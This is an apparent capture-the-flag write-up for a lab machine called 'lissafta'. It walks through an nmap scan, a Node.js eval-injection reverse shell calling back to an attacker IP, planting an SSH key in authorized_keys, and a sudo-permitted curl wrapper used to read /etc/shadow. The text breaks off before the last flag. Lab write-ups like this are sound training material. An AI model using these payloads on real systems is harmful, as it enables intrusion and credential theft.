# Title : lissafta 


## scanning 

```bash 

nmap -sC -sV 10.0.1.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 14:27 WAT
Nmap scan report for 10.0.1.4
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 55:40:43:a8:95:a1:a3:6b:cc:7e:00:c7:47:40:1f:22 (RSA)
|   256 48:ad:4b:ef:a5:b2:20:ac:64:bc:13:f1:49:78:e3:3f (ECDSA)
|_  256 ba:ad:c7:79:af:0c:72:a6:54:b5:22:f0:05:7c:ba:c6 (ED25519)
3000/tcp open  http    Node.js Express framework
|_http-title: Calculator App
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.19 seconds


```

- port `3000` is open and `Node.js Express framework` is running on it

- i set-up a proxy, and intercept the request wiith my burpsuite
- i found that it all us to use eval
- make a research on eval payload

```bash

eval((function(){var+net+=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",[]);var+client+=+new+net.Socket();client.connect(80,"10.10.0.102",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return+/a/;}))

```


 - i use python to stablizer my shelll

 ```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

 ctrl + z

stty raw -echo && fg

 ```

 -  i check the variable environment

 ```bash
 

ETSCTF@lissafta:~$ env
SUPERVISOR_GROUP_NAME=calculator
SUPERVISOR_SERVER_URL=unix:///run/supervisord.sock
HOSTNAME=lissafta.afrihackbox.ctf
PWD=/opt/calculator-boilerplate-main
TINI_VERSION=v0.19.0
HOME=/opt/calculator-boilerplate-main
TERM=xterm
SHLVL=3
LC_CTYPE=C.UTF-8
SUPERVISOR_PROCESS_NAME=calculator
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ETSCTF_FLAG=ETSCTF_11b899d25ce71827f98b9af6bcbb32e4
DEBIAN_FRONTEND=noninteractive
SUPERVISOR_ENABLED=1
_=/usr/bin/env
ETSCTF@lissafta:~$ 



 ```

 - the second flag was find in `/etc/passwd`

 ```bash

 ETSCTF@lissafta:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
ETSCTF:x:1000:65534:ETSCTF_5379ac9d2b6f3cd8f12b79fa65c1944c:/home/ETSCTF:/bin/bash


 ```

- i exploit the ssh vulnerable 

- by generating my `ssh-keygen`

```bash

ETSCTF@lissafta:/home$ cd ETSCTF/
ETSCTF@lissafta:/home/ETSCTF$ ls
ETSCTF@lissafta:/home/ETSCTF$ ls -a
.  ..  .bash_logout  .bashrc  .profile	.ssh
ETSCTF@lissafta:/home/ETSCTF$ cd .ssh
ETSCTF@lissafta:/home/ETSCTF/.ssh$ ls
authorized_keys
ETSCTF@lissafta:/home/ETSCTF/.ssh$  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAUsRw/l0agaoZ+VXjh21Emt/dMU+iuZme+U1UCNwM5f gra@hjksxsksk" > authorized_keys

```

- on my host pc 

```bash

$ chmod 600 ./ctf            
                                                           $ ssh -i ./ctf ETSCTF@10.0.1.4
Linux lissafta.afrihackbox.ctf 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

```

- we need the root permission to read file in the root directory

```bash

ETSCTF@lissafta:~$ sudo -l
Matching Defaults entries for ETSCTF on lissafta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ETSCTF may run the following commands on lissafta:
    (ALL : ALL) NOPASSWD: /usr/bin/curling

```

- This means the user ETSCTF can run /usr/bin/curling as any user (including root) without a password. The key is figuring out what /usr/bin/curling is.

## Check what /usr/bin/curling is

```bash

ETSCTF@lissafta:~$ ls -l /usr/bin/curling

lrwxrwxrwx 1 root root 40 Oct 10  2024 /usr/bin/curling -> ../lib/node_modules/curling/bin/index.js


```

- You can also inspect the contents directly if it's a script:

```bash

ETSCTF@lissafta:~$ cat /usr/bin/curling
#! /usr/bin/env node
var args = process.argv.slice(2);
var curl = require("curlrequest");
try {
  if(args.length==0)
  {
    console.log("Missing params");
    process.exit(1);
  }
  const obj = JSON.parse(args[0]);

  curl.request(obj, function (err, stdout, meta) {
      console.log(stdout);
  });
} catch (e) {
	console.log(e);
}


```

- exploit


```bash 


ETSCTF@lissafta:~$ sudo /usr/bin/curling '{"url":"file:///etc/shadow"}'
root:*:19458:0:99999:7:::
daemon:*:19458:0:99999:7:::
bin:*:19458:0:99999:7:::
sys:*:19458:0:99999:7:::
sync:*:19458:0:99999:7:::
games:*:19458:0:99999:7:::
man:*:19458:0:99999:7:::
lp:*:19458:0:99999:7:::
mail:*:19458:0:99999:7:::
news:*:19458:0:99999:7:::
uucp:*:19458:0:99999:7:::
proxy:*:19458:0:99999:7:::
www-data:*:19458:0:99999:7:::
backup:*:19458:0:99999:7:::
list:*:19458:0:99999:7:::
irc:*:19458:0:99999:7:::
gnats:*:19458:0:99999:7:::
nobody:*:19458:0:99999:7:::
_apt:*:19458:0:99999:7:::
sshd:*:20006:0:99999:7:::
ETSCTF:ETSCTF_385a8ae26e01542f89c9ec13031ec8db:20006:0:99999:7:::

```

- TO get the last flag 